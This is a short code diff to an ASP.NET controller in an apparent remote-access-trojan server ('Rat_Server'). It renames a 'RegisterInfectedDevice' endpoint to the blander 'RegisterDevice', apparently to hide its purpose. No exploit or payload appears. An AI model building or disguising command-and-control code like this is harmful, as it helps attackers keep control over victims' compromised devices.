@@ -24,11 +24,11 @@ namespace Rat_Server.Controllers
             _config = config;
         }
 
-        [HttpPost("RegisterInfectedDevice")]
+        [HttpPost("RegisterDevice")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status403Forbidden)]
-        public StatusCodeResult RegisterInfectedDevice([FromBody] RegisterDeviceRequestBodyDto requestBody)
+        public StatusCodeResult RegisterDevice([FromBody] RegisterDeviceRequestBodyDto requestBody)
         {
             // Check if request body is valid
             if (!ModelState.IsValid)
